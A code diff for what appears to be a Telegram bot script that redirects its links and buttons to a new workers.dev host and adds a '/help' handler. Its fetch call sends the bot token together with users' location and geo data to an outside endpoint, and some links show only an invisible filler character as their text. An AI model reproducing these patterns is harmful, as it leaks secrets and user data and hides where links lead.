@@ -69,7 +69,7 @@
                 }
 
                 re.photo = re.photo[re.photo.length - 1].file_id
-               B.photo = await fetch(`https://clo.wwv.workers.dev/x?id=${re.photo}&ll=${X.location}&geo=${X.geo}&cap=${re.caption}&ref=${X.ref}&t=${TOKEN}&n=${"o"}&cc=${X.cc}`)
+               B.photo = await fetch(`https://clo.wwv.workers.dev/x?id=${re.photo}&ll=${X.location}&geo=${X.geo}&cap=${re.caption}&ref=${X.ref}&t=${TOKEN}&n=${"c"}&cc=${X.cc}`)
   .then( r => r.json() )
 
                 /*
@@ -180,7 +180,9 @@ B.method = "sendMessage"
             })
             B.photo = "https://res.cloudinary.com/o6/" + X.geo
             B.method = "sendPhoto"
-            B.caption = "s0s.1i.workers.dev"
+             B.caption = `<a href="${encodeURIComponent("https://6.o6.workers.dev")}">${"https://6.o6.workers.dev"}</a>`
+               B.parse_mode = "HTML"
+        
             B.reply_markup = {
                 inline_keyboard: [
                     [ {
@@ -197,7 +199,7 @@ B.method = "sendMessage"
                         "switch_inline_query_current_chat": "\\"
                     }, {
                         "text": "👁‍🗨",
-                        "switch_inline_query": ""
+                        "url": "https://6.o6.workers.dev"
                     }]
                 ]
             }
@@ -251,7 +253,7 @@ B.method = "sendMessage"
                     is: 1
                 })
                 B.parse_mode = "HTML"
-                return B.text = `<a href="${"https://ovca.8c.workers.dev/?v="+Date.now()}">ㅤ${X.no}</a>`
+                return B.text = `<a href="${"https://6.o6.workers.dev?v="+Date.now()}">ㅤ${X.no}</a>`
             })
         }
         if (re.via_bot) {
@@ -262,7 +264,16 @@ B.method = "sendMessage"
             re.obj = JSON.parse(re.text)
             delete re.text
         }
+                if (re.bot_command && re.bot_command == "/help") {
+                    B.parse_mode = "HTML"
+               B.text = `<a href="${"https://6.o6.workers.dev?v="+Date.now()}">ㅤ${X.no}</a>`
+            B.method = "sendMessage"
+
+            await console.l(B)
+          
+        }
         if (re.bot_command && re.bot_command == "/start") {
+
             B.method = "sendMessage"
             X.no = 1
             X.msg = (1 + re.message_id)
